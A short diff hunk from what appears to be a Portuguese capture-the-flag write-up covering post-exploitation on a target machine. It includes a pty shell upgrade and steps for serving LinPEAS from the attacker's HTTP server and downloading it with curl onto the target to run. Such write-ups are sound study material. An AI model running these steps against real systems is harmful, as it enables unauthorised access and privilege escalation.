@@ -51,7 +51,7 @@ Vamos melhorar ela com ```python3 -c 'import pty, os; pty.spawn("/bin/bash")'```
 ## _**Ganhando acesso**_
 Primeiro, vamos investigar um pouco  
 Após um tempo procurando algum arquivo explorável com alguns comandos básicos, foi decidido usar o programa <mark>LinPeas</mark> para essa tarefa  
-Primeiro, ligamos nosso servidor HTTP com: ```python3 -m http.server 8080```
+Primeiro, ligamos nosso servidor HTTP com: ```python3 -m http.server 8080```  
 Em seguida, na máquina-alvo, buscamos com: ```curl http://[ip_address]:[port]/linpeas.sh -o /tmp/linpeas.sh```; obs: com ```wget``` estava dando erro  
 Damos as permissões necessárias e em seguida, executamos  
 
